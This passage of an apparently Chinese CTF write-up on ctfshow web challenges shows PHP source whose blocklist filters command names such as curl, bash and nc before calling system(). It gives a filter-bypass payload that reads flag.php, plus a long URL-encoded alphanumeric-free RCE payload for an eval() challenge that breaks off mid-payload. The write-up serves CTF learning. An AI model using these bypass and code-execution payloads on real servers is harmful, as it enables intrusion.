class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"more"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tail"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"less"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tac"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"sort"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"nl"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/['\*\"[?]/"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'非预期修复*2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这题和上题差不多，只是最后的命令多过滤了一些，直接给出payload：</p><pre><code>?num=1000000000000000.00000000000000010&amp;md5=0e2010692162&amp;get_flag=ca\t&lt;flag.ph\p</code></pre><h3 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h3><p>源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=hhh.php');</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'\~'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blacklisted</span> <span class="token punctuation">.</span> <span class="token string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo($code);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>直接给出P神的payload(无字母数字的RCE)：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p>GET：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span>5b<span class="token operator">%</span>5d<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>3d<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>5d<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>5f<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span 